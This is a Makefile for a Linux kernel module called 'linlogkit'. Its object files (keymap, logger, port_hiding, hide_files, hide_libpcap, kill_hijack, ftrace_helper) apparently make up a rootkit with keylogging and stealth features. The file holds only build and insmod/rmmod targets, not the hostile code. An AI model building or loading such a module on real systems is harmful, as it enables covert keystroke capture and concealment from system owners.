modname := linlogkit
obj-m := $(modname).o


linlogkit-objs := main.o logger.o keymap.o netfilter.o port_hiding.o ftrace_helper.o hide_libpcap.o hide_files.o kill_hijack.o

KVERSION = $(shell uname -r)
KDIR := /lib/modules/$(KVERSION)/build

ifdef DEBUG
CFLAGS_$(obj-m) := -DDEBUG
endif

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

load:
	-rmmod $(modname)
	insmod $(modname).ko

unload:
	-rmmod $(modname)